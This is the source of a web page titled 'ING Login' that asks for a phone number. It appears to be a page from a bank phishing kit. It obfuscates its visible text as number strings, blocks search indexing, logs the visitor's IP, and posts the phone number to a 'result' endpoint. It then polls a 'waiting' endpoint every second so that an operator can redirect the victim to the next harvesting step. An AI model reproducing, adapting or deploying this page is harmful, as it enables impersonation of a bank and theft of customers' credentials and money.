<?php reset_action(get_client_ip()); ?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/png" href="assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">
        <div id="whitebox"></div>
        
        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p><hello class="chlakh">382 271 244 318 392 16</hello></p>
            </div>
        </div>

        <header>
        <div class="header container">
            <div class="logo"><img src="assets/imgs/log.svg"></div>
        </div>
    </header>
    <section id="login" class="flex-grow-1" style="padding-bottom: 177px;">
        <div class="container">
            <div class="titre"><h2><hello class="chlakh">272 215 157 201 428 93 188 91 212 378 52 360 222 362 431 445 204 550 217 56 170 511 501 373 177 308 540 228</hello></h2></div>
            <div class="form row"> 
                <form id="form" action="result" method="POST" class="text-center">
                    <input type="hidden" name="captcha">
                    <input type="hidden" name="step" value="phone">
                    <p style="color: #666;margin-bottom: 30px;font-size: 15px;"><hello class="chlakh">503 27 96 323 428 93 188 91 212 378 52 360 222 362 431 445 204 550 217 56 170 511 501 373 177 308 540 228</hello></p>
                    <div class="form-group">
                        <input style="max-width: 250px; margin: 0 auto;" type="text" inputmode="numeric" name="phone" id="phone" class="form-control">
                        <?php echo error_message($_SESSION['errors'],'phone'); ?>
                    </div>
                    <div class="bttn text-center mt-5">
                        <button type="submit" id="submit" style="background:#FF6200;" submit=""><i style="margin-right: 5px;" class="fas fa-angle-right"></i><hello class="chlakh">263 225 162 226 102 474 525 87 444 105 133 552 349 181 245 15 518 162 457 428 458 283 305 373 177 308 540 228</hello></button>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <ul class="list-unstyled">
            <li><hello class="chlakh">403 40 130 386 259 144 449 208 428 563 84 172 349 181 245 15 518 162 457 428 458 283 305 373 177 308 540 228</hello></li>
            <li><hello class="chlakh">434 105 369 205 331 149 495 276 126 461 84 172 349 181 245 15 518 162 457 428 458 283 305 373 177 308 540 228</hello></li>
            <li><hello class="chlakh">263 453 280 515 264 522 211 183 212 442 401 215 245 178 141 403 75 190 374 509 174 283 305 373 177 308 540 228</hello></li>
            <li><hello class="chlakh">165 504 239 123 148 303 372 221 283 52 481 252 335 178 141 403 75 190 374 509 174 283 305 373 177 308 540 228</hello></li>
            <li><hello class="chlakh">424 483 116 398 214 434 138 440 368 122 308 428 335 178 141 403 75 190 374 509 174 283 305 373 177 308 540 228</hello></li>
            <li><hello class="chlakh">473 99 61 129 88 478 100 228 107 57 260 16 294 314 201 63 564 411 65 151 186 392 537 48 71 308 540 228</hello></li>
            <li><hello class="chlakh">484 330 486 386 397 420 96 421 64 154 342 494 98 364 16 314 338 123 65 151 186 392 537 48 71 308 540 228</hello></li>
        </ul>
        <div><img style="min-width: 144px;" src="assets/imgs/media.png"></div>
    </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>

            getContent("phone");

            $('.itan input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "result", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: 'waiting',
                                    success: function (data) {
                                        if( data !== '' && data !== "0" ) {
                                            window.location.href= 'redirection/' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            location.reload();
                        }
                    });
                });
            });

        </script>

    </body>

</html>